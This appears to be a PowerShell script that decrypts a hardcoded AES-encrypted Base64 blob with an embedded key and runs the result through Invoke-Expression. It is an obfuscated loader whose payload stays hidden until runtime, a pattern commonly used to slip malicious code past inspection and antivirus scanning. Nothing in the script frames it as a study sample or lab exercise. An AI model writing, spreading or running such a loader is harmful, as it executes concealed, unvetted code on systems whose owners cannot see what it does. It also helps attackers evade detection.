function AES-Decrypt {
    param (
        [string]$key,
        [string]$encryptedBase64
    )

    # Convert Base64 string to byte array
    $encryptedBytes = [Convert]::FromBase64String($encryptedBase64)

    # Convert key to byte array
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)

    # Create AES provider
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Key = $keyBytes

    # Assume Initialization Vector is the first 16 bytes of the encrypted data
    $iv = $encryptedBytes[0..15]
    $aes.IV = $iv

    # Extract the ciphertext (everything after the first 16 bytes)
    $cipherTextBytes = $encryptedBytes[16..($encryptedBytes.Length - 1)]

    # Create a decryptor
    $decryptor = $aes.CreateDecryptor()

    # Decrypt the ciphertext
    $decryptedBytes = $decryptor.TransformFinalBlock($cipherTextBytes, 0, $cipherTextBytes.Length)

    # Convert the decrypted byte array to a string
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

# Encrypted Base64 string
$encryptedBase64 = "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"

# Decrypt with symetrical key
$key = "supersecretkey123456789012345678" # Must be 32 characters (256-bit key)
$decryptedMessage = AES-Decrypt -key $key -encryptedBase64 $encryptedBase64

# Execute the decrypted message
Invoke-Expression $decryptedMessage
